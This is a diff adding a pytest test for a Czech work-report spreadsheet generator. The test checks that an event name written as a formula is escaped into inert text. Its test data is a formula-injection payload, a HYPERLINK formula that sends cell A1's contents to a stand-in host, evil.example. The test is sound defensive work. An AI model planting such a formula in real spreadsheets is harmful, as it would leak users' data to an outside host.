@@ -192,6 +192,24 @@ class TestVykazGenerator:
         assert ws.cell(row=day_row, column=3).value == pytest.approx(4.0)
         assert "Hasiči 2026" in (ws.cell(row=day_row, column=4).value or "")
 
+    def test_generator_escapes_formula_starters_in_event_names(self, app, tmp_path, monkeypatch):
+        """An event named like a formula must land in the sheet as inert text."""
+
+        start = datetime(2026, 3, 15, 10, 0, tzinfo=timezone.utc)
+        end = datetime(2026, 3, 15, 14, 0, tzinfo=timezone.utc)
+        payload = '=HYPERLINK("http://evil.example/"&A1,"Klikni")'
+
+        with app.app_context():
+            monkeypatch.setattr(app, "instance_path", str(tmp_path))
+            u = _make_user("vykaz_inj@test.com", "Vykaz User", Role.MEMBER)
+            _make_paid_event(u, start, end, actual_hours=4.0, name=payload)
+            path = generate_work_report(u, 2026, 3)
+
+        wb = openpyxl.load_workbook(str(path))
+        ws = wb.active
+        day_row = 10 + 15 - 1
+        assert ws.cell(row=day_row, column=4).value == "'" + payload
+
     def test_generator_holiday_yellow(self, app, tmp_path, monkeypatch):
         """January 1 (Czech public holiday) should have yellow fill."""
 
